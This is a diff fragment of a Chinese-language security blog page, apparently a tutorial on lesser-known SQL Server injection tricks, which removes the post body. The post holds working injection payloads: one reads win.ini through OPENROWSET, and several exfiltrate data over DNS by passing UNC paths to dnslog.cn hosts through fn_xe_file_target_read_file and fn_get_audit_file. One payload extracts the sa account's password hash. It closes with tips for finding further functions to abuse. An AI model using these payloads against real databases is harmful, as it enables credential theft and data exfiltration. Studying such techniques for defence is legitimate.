-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AtUsers where id&#x3D;-1 union select  null,(SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document),null,null</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115448908.png" alt="image-20201119115448908"></p>
-<h2 id="获取当前正在执行的语句"><a href="#获取当前正在执行的语句" class="headerlink" title="获取当前正在执行的语句"></a>获取当前正在执行的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115716185.png" alt="image-20201119115716185"></p>
-<p>​    这种语句在报错注入中仍然是有效的</p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115821821.png" alt="image-20201119115821821"></p>
-<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>​    通过fn_xe_file_target_read_file加载UNC路径请求DNS,虽然这个函数第一个和第二个参数都是文件路径，但实际上会先去请求第一个参数对应的路径，所以一般情况下最好用第一个参数加载执行，当我们多次请求同一个UNC路径，只会执行第一次，所以每次执行完后，最好将前面的路径稍微改一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;\\1a.idbfh8.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133707689.png" alt="image-20201119133707689"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133712427.png" alt="image-20201119133712427"></p>
-<p>​    在什么情况下可以用fn_xe_file_target_read_file的第二个参数进行利用呢，答案是当第一个参数指定的路径存在的情况下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;c:\windows\win.ini&#39;,&#39;\\jtf50t.dnslog.cn\1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133934287.png" alt="image-20201119133934287"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133951324.png" alt="image-20201119133951324"></p>
-<p>​    我测试了报错注入和UNION下利用这种方式外带数据，都是不行的，但在where后添加EXISTS函数执行是可以的,这里有一个小坑，<strong>就是and前面的参数的内容必须是存在的，才会执行DNS请求，否则不会执行成功。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\1a.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141927943.png" alt="image-20201119141927943"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141953818.png" alt="image-20201119141953818"></p>
-<p>​    还有一个问题是我们如果想要利用这种方式外带数据，该怎么利用，这个语句因为出现了+号，所以在get提交时需要注意URL编码的问题。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\&#39;+(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name&#x3D;&#39;sa&#39;)+&#39;.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142531471.png" alt="image-20201119142531471"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142548412.png" alt="image-20201119142548412"></p>
-<p>​        和fn_xe_file_target_read_file类似的函数还有fn_get_audit_file，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_get_audit_file(&#39;\\zwbqeg.dnslog.cn\11.xxx&#39;,default,default)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142900030.png" alt="image-20201119142900030"></p>
-<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142908659.png" alt="image-20201119142908659"></p>
-<p>​    作者还提供了fn_trace_gettable函数，不过这种利用方式我并没有复现成功。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    对于该作者挖掘到这些关于注入利用的函数，我们肯定也在想他是如何找到这些函数的，这里我大致做一下分析。</p>
-<p><strong>报错注入函数</strong></p>
-<p>​    我查阅了一些资料，这些函数都有一些共同点，就是接收的参数是int型的参数，并且返回值是varchar类型，如果我们想要挖掘其他的可以报错的函数，可以寻找这种类型的函数。</p>
-<p><strong>DNS注入函数</strong></p>
-<p>​    DNS外带数据的函数也比较明显，就是他们都是文件操作的函数，也就是说会进行文件读取操作的函数，那如果给这些函数的参数传入UNC路径的内容，就可能会存在DNS请求。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -2351,7 +2343,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
